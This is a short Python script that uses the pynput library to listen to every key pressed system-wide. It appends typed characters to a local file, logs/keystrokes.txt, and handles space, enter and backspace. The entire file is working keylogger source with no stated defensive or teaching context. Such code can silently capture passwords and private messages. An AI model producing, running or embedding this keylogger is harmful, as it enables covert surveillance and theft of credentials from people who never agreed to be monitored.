from pynput import keyboard

def on_press(key):
    try:
        # Regular character
        char = key.char
        with open("logs/keystrokes.txt", "a") as log_file:
            log_file.write(char)
    except AttributeError:
        # Special keys
        key_str = str(key).replace("Key.", "")
        if key_str == "space":
            with open("logs/keystrokes.txt", "a") as log_file:
                log_file.write(" ")
        elif key_str == "enter":
            with open("logs/keystrokes.txt", "a") as log_file:
                log_file.write("\n")
        elif key_str == "backspace":
            # Remove last character from file
            try:
                with open("logs/keystrokes.txt", "r") as f:
                    content = f.read()
                if content:
                    with open("logs/keystrokes.txt", "w") as f:
                        f.write(content[:-1])
            except:
                pass
        # Ignore other special keys (shift, ctrl, alt, etc.)

def start():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
